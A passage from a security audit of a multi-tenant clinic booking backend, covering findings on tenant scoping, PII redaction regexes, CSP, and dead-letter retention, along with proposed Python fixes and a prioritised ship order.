                ).eq("id", booking_id).eq("clinic_id", clinic["id"]).eq(
                    "status", "pending_payment"
                ).execute()
```

```python
# app/services/conversation.py:2862-2867
                result = (
                    supabase.table("appointments")
                    .select("status, booking_ref")
                    .eq("id", booking_id)
                    .eq("clinic_id", clinic["id"])
                    .execute()
                )
```

Adopt the rule platform-wide: **every** `supabase.table("appointments")` call carries `.eq("clinic_id", ...)`. It is mechanically checkable in CI.

---

## M6 — `enforce_branch_scope` is not an ownership check

**[LOCATION]** `app/services/permissions.py` (`enforce_branch_scope`), used across `app/routers/admin.py`

**[ROOT CAUSE]** Documented in full under C7. Calling it out separately because the *name* is the hazard: reviewers reading `enforce_branch_scope(user, branch_id)` reasonably conclude the branch has been authorised, and the four C7 endpoints are the result. Any future endpoint accepting a `branch_id` will repeat it.

**[PRODUCTION-READY FIX]** Ship `resolve_owned_branch` (C7) and rename the old helper to say what it does:

```python
# app/services/permissions.py
def assert_staff_not_pinned_elsewhere(user, branch_id: str) -> None:
    """Reject staff pinned to a DIFFERENT branch.

    This is NOT an ownership check — it passes unconditionally for clinic_admin
    and for unpinned staff. Use resolve_owned_branch() to authorise a
    client-supplied branch_id.
    """
```

Keep `enforce_branch_scope = assert_staff_not_pinned_elsewhere` as a deprecated alias for one release so nothing breaks, then remove it.

---

# LOW

## M7 — Hardcoded "10 minutes" copy vs configurable `booking_hold_minutes`

**[LOCATION]** `app/services/conversation.py:2563`, `2576`, `2589`, `2605` (all four language variants)

**[ROOT CAUSE]** The patient-facing message hardcodes "held for 10 minutes" while the enforced window is `settings.booking_hold_minutes` (default 10, `app/config.py:73`). Any tenant configured to 15 or 20 gets a message that contradicts the system's behaviour.

**[DATABASE / SECURITY IMPACT]** A stated commercial term that does not match enforcement — the kind of discrepancy that loses a consumer-forum dispute over a forfeited payment.

**[PRODUCTION-READY FIX]**

```python
# app/services/conversation.py — before building payment_msg (~L2530)
                    hold_mins = settings.booking_hold_minutes
```
Then in each variant: `f"⏱️ *This slot is held for {hold_mins} minutes.* Pay before it expires.\n\n"` (and the `hi`/`te` equivalents). Ship alongside C3 so the copy, the DB hold, and the Razorpay `expire_by` all state the same number.

---

## M8 — Age/DOB regexes over-redact lab values

**[LOCATION]** `app/utils/pii_sanitizer.py:42-52`

**[ROOT CAUSE]** `_AGE_PATTERN` matches `\b\d{1,3}\s*(?:years?|yrs?|Y)\b`. In a lab report `Vitamin D  32 Y` or a reference range annotated `Y` gets redacted. `_DOB_PATTERN` matches any `d/d/d`, catching ratios and dated reference notes.

**[DATABASE / SECURITY IMPACT]** No leak — this over-redacts. But it degrades summary quality: the LLM receives `[AGE_7]` where a clinical value belonged, which can produce a misleading patient summary. In a clinical-safety context, quality degradation of a patient-facing medical message is not purely cosmetic.

**[PRODUCTION-READY FIX]** Require a label for the age match, and anchor DOB to a labelled context:

```python
# app/utils/pii_sanitizer.py:47-52
# Only redact AGE when it is explicitly labelled. The bare "\d+ Y" form matched
# lab values and reference ranges, replacing clinical data with placeholders and
# degrading the patient summary.
_AGE_PATTERN = re.compile(
    r"\b(?:age|age\s*/\s*sex)\s*:?\s*\d{1,3}(?:\s*/\s*[MFmf])?\b",
    re.IGNORECASE,
)

_DOB_PATTERN = re.compile(
    r"\b(?:dob|d\.o\.b|date\s+of\s+birth|birth\s*date)\s*:?\s*"
    r"(\d{1,2}[/\-.]\d{1,2}[/\-.]\d{2,4}|\d{4}[/\-.]\d{1,2}[/\-.]\d{1,2})\b",
    re.IGNORECASE,
)
```

Add a unit test with a real haematology report fixture asserting that Hb/WBC/platelet values survive sanitisation while name/phone/Aadhaar/DOB do not.

---

## L1 — CSP `script-src 'unsafe-inline'` negates XSS hardening

**[LOCATION]** `app/utils/security.py` (`SECURITY_HEADERS`)

**[ROOT CAUSE]** The CSP permits inline script, which is what makes H6 exploitable rather than merely ugly. It is required today because `admin/index.html` is a single file of inline handlers and inline `<script>`.

**[PRODUCTION-READY FIX]** Sequenced, because dropping it now breaks the panel:
1. Ship H6's delegated-listener pattern everywhere (removes inline `onclick`).
2. Move the inline `<script>` bodies to `/admin/app.js` served from the same origin.
3. Then tighten: `script-src 'self'`.

Until step 3 lands, treat every panel sink as directly exploitable and escape accordingly.

---

## L2 — Dead-letter queue stores full raw webhook payload unencrypted

**[LOCATION]** `app/routers/webhook.py:140-148`; same at `app/services/conversation.py:189-204`

**[ROOT CAUSE]** `"payload": json.dumps(raw_payload)` writes the complete Meta webhook body — patient phone, profile name, and full message text (which the clinical firewall exists precisely because it contains symptoms) — into `failed_messages` in the clear, with no retention bound.

**[DATABASE / SECURITY IMPACT]** An unbounded, unindexed PHI store outside the retention policy. `data_retention.py` purges `conversations` at 30 days and `analytics_events` at 12 months; `failed_messages` is purged by nothing. DPDP storage-limitation breach that grows monotonically.

**[PRODUCTION-READY FIX]** Store what replay needs, redact the rest, and put it on the retention schedule.

```python
# app/routers/webhook.py — process_message_safe DLQ write
            from app.utils.pii_sanitizer import sanitize_report_text

            body_text = json.dumps(raw_payload) if raw_payload else "{}"
            # Replay needs the envelope, not the clinical content. Sanitize before
            # persisting — failed_messages is not covered by any purge job.
            safe_payload, _ = sanitize_report_text(body_text)

            supabase.table("failed_messages").insert({
                "phone": mask_phone(getattr(message, "from_", "unknown")),
                "display_phone": display_phone,
                "message_id": getattr(message, "id", None),
                "payload": safe_payload[:10000],
                "error": str(e)[:500],
                "status": "pending",
            }).execute()
```

```python
# app/services/data_retention.py — add to the daily job
    async def purge_expired_failed_messages(self, days: int = 30) -> int:
        """Purge dead-lettered webhooks after the replay window closes."""
        cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
        try:
            result = (
                supabase.table("failed_messages")
                .delete()
                .lt("created_at", cutoff)
                .neq("status", "pending_retry")
                .execute()
            )
            count = len(result.data) if result.data else 0
            if count:
                logger.info(f"Data retention: purged {count} dead-lettered messages")
            return count
        except Exception as e:
            logger.error(f"failed_messages purge error: {e}")
            return 0
```

---

# Verified Correct (no action)

Recording these so future audits do not re-litigate them:

- **Meta signature verification fails closed** — `security.py:verify_webhook_signature` only bypasses when `app_env == "development" AND allow_unsigned_webhooks_dev`. Correct.
- **Production boot refuses placeholder secrets** — `main.py` rejects default `META_APP_SECRET`, `ADMIN_PASSWORD`, `OWNER_PASSWORD`, `INTEGRATION_SECRET`, `CALLMEDEX_BEARER_TOKEN`, and disables `/docs`. Correct.
- **Double-booking is DB-enforced** — `idx_unique_active_slot` (migration 008) covers `pending_payment` + `confirmed`. The SELECT-then-INSERT in `book_appointment` is properly backstopped; H3 is about the *display* disagreeing, not the constraint failing.
- **`payment_events` is genuinely append-only** — the `prevent_payment_event_mutation()` trigger plus RLS in migration 008 is sound; the C2/C4 findings are about what gets *written*, not about tamper-resistance.
- **Token sequencing is safe** — `check_in_appointment` (`database.py:699-761`) uses a bounded read-max-then-update retry against `idx_unique_queue_token`; gap-resilient and correct under the morning rush.
- **`log_admin_action` offloads correctly** — the one place in the codebase already using `asyncio.to_thread` for Supabase. Use it as the template for H10.
- **Login brute-force protection** — `verify_credentials` runs `login_rate_limiter.check_and_record(client_ip)` against the Supabase-backed atomic RPC, with `secrets.compare_digest` for the env super-admin fallback. Correct.
- **Clinical firewall placement** — screening runs before any Groq/OpenRouter call (`conversation.py:303-320`) and returns a static safe response, so medication/dosage requests never reach the LLM. Correct.
- **Lab-test bookings intentionally bypass the slot index** — migration 039 documents `doctor_name = NULL` for lab tests so `idx_unique_active_slot` does not constrain them. Deliberate, documented.

---

# Recommended Ship Order

**Hotfix now (money and PHI actively at risk):**
1. C4 — refund-before-cancel (patients are owed money today)
2. C2 — clinic-scope the webhook lookup (cross-tenant financial write)
3. C1 — tenant fail-closed (cross-tenant PHI misroute)
4. H7 + C3 — webhook exception guard, `expire_by`, late-payment auto-refund (ship as one unit)

**Next deploy:**
5. C7 + M6 + H9 — `resolve_owned_branch` and the scoped read endpoints
6. C6 — claim-before-send for lab reports
7. C5 + H8 — fail-closed idempotency with claim release
8. H5 — stop sending the patient name to OpenRouter
9. H6 — panel XSS via data-attribute binding

**Following sprint:**
10. H1, H2, H3, H4 — freeform fail-closed, monotonic receipts, hold-aware slots, IST correctness
11. H10 + M1 — `sb()` offload, hot paths first
12. M2, M3, M4, M5, M7, M8, L1, L2

Each numbered item is independently deployable; items grouped on one line share a code path and should ship together.
